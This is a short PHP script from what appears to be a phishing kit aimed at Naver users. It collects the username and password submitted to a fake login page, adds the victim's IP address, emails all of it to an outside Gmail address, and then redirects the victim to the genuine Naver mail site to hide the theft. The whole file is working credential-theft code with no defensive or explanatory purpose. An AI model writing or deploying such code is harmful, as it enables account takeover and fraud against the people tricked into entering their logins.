<?php 

error_reporting(0);

$ip = getenv("REMOTE_ADDR");

$message  = "==================+[ Naver Resultz ]+==================\n";
$message .= "login  : ".$_POST['id']."\n";
$message .= "Passwd1 : ".$_POST['pw']."\n\n";
$message .= "Client IP : ".$ip."\n";

$message .= "=============+[ Naver Resultz ]+=============\n";

$send= "Latinoworld0417@gmail.com";

$subject = "Login! | Naver Resultz | $ip";
$headers = "From: REPORT!<Mr.HiTman@Alpha.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send,$subject,$message,$headers);

header("Location:https://mail.naver.com");
?>